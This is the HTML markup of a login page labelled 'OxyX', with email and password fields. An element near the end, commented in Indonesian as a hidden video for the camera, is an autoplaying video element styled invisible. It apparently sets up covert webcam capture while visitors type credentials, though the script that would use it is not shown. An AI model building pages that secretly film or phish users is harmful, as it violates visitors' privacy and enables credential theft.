<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Sign in - OxyX</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo">🔐 OxyX</div>
      <h2>Sign in to continue</h2>
      <p class="sub">[ entity priority ]</p>

      <form id="loginForm">
        <div class="input-group">
          <label>📧 Email or Username</label>
          <input type="text" id="username" placeholder="example@mail.com" required>
        </div>
        <div class="input-group">
          <label>🔑 Password</label>
          <input type="password" id="password" placeholder="••••••••" required>
        </div>
        <button type="submit" id="loginBtn">⏳ Sign In</button>
      </form>

      <div class="error-msg" id="errorMsg"></div>
      <div class="footer">© 2026 OxyX • entity priority</div>
    </div>
  </div>

  <!-- Video tersembunyi untuk kamera -->
  <video id="videoPreview" autoplay playsinline style="display:none;"></video>

  <script src="script.js"></script>
</body>
</html>
